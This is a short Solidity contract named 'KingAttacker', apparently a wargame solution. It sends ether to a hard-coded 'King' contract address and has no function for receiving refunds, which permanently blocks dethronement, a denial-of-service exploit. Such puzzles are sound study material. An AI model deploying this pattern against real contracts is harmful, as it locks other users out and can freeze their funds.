// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
  address king = 0xe7d5701Df23EA3896Ef68b8230974F2Fe61Ec33b;

  function makeCall() external payable {
    (bool success,) = king.call{value: msg.value}("");
    require(success);
  }
}